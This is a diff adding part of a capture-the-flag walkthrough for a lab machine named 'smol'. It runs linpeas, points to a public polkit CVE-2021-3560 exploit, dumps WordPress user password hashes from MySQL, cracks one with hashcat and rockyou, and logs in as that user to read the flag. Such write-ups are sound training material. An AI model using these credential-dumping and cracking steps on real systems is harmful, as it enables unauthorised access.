@@ -652,3 +652,100 @@ www-data@smol:/home$ find / -type f -perm /4000 2>/dev/null
 /usr/bin/umount
 ```
 maybe polkit has vulns.
+
+Whatever lets run linpeas.
+
+And when I runned linpeas it directly sayed me that
+
+Vulnerable to CVE-2021-3560
+
+which is polkit privilage escalation.
+
+We can use this <https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation>
+bash script to escalate privilages.
+
+I tried this but it didn't worked. So i guess we can try to log into mysql.
+
+
+```bash
+www-data@smol:/tmp$ mysql -u wpuser -p'******************' -D wordpress
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 419
+Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> 
+```
+
+Lets look enumerate more.
+
+
+
+```bash
+mysql> select * from wp_users;
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+-----------------------------------------------+-------------+------------------------+
+| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key                           | user_status | display_name           |
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+-----------------------------------------------+-------------+------------------------+
+|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 | 1751629487:$P$Bj52G7q0ddwJVNl/oA7EW5CKSFanWB0 |           0 | admin                  |
+|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                                               |           0 | wordpress user         |
+|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                                               |           0 | Jose Mario Llado Marti |
+|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                                               |           0 | gege                   |
+|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                                               |           0 | diego                  |
+|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                                               |           0 | xavi                   |
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+-----------------------------------------------+-------------+------------------------+
+6 rows in set (0.00 sec)
+```
+
+You can see that we got password hashes:
+
+
+```text
+admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
+think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
+gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
+diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
+xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
+```
+
+We can use hashcat to crack these hashes.
+
+
+
+```bash
+❯ hashcat -m 400 -a 0 hashes/hash.txt rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 CUDA 12.9.90) - Platform #1 [NVIDIA Corporation]
+=======================================================================
+
+Dictionary cache built:
+* Filename..: rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 0 secs
+
+$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1:***************     
+```
+
+And after 10 seconds I get password for diego.
+
+
+Lets log into diego.
+
+```bash
+www-data@smol:/tmp$ su diego
+Password: 
+diego@smol:/tmp$ ls
+f  poc.sh  tmux-33
+diego@smol:/tmp$ cd
+diego@smol:~$ ls
+user.txt
+diego@smol:~$ 
+```
+
+```bash
+diego@smol:~$ cat user.txt 
+45edaec653ff9ee06236b7ce72b86963
+```
